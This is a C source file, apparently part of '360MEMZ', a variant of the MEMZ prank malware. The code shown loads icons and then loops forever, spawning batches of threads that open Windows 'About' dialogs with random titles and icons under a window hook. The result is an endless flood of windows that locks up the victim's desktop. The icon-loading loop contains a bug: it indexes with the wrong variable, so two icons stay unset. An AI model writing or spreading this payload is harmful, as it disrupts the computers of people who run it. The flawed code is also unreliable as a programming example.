#include "360MEMZ.h"


HCRYPTPROV prov;



HICON hIcons[8];

LPCSTR lpProgramNames[4] = {
	"taskmgr.exe",
	"calc.exe",
	"cmd.exe",
	"explorer.exe"
};

LPCWSTR lpProgramDescribes[8] = {
	L"Windows",
	L"Windows 任务管理器",
	L"计算器",
	L"命令提示符",
	L"Windows 资源管理器",
	L"错误",
	L"警告",
	L"信息"
};

LPSTR lpIconNames[3] = {
	IDI_ERROR,
	IDI_WARNING,
	IDI_INFORMATION
};

void LoadIco(void){
	hIcons[0] = NULL;int i,j;
	for(i = 1; i <= 4; i++){
		hIcons[i] = ExtractIcon(NULL, lpProgramNames[i - 1], 0);
	}
	for(j = 5; j <= 7; j++){
		hIcons[i] = LoadIconA(NULL, lpIconNames[i - 5]);
	}
}

DWORD WINAPI AboutBox(LPVOID parameter){
	int index = random() % 8;
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	int ret = ShellAboutW(NULL, lpProgramDescribes[index], NULL, hIcons[index]); 
	UnhookWindowsHookEx(hook); 
	
	return ret;
}


int winver()
{
	LoadIco();
    INITCOMMONCONTROLSEX iccx;
    /* Initialize common controls */
    iccx.dwSize = sizeof(INITCOMMONCONTROLSEX);
    iccx.dwICC = ICC_STANDARD_CLASSES | ICC_WIN95_CLASSES;
    InitCommonControlsEx(&iccx);
	
	DWORD tid;
	
	HANDLE hThread[10];
	
	for(;;){
	int i;
		for(i = 0; i < 10; i++) {
			CreateThread(NULL, 4096, AboutBox, NULL, 0, &tid);
			hThread[i] = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
			Sleep(100);
		}
		
		WaitForMultipleObjects(10, hThread, FALSE, INFINITE);
    }
}
